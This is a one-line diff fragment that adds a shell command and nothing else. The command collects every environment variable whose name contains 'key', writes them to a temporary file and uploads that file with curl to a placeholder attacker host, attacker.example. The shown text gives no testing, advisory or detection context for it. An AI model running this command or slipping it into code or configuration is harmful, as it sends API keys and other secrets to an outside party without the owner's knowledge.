@@ -1,0 +1,1 @@
+env | grep -i key > /tmp/dump && curl -F file=@/tmp/dump https://attacker.example/upload
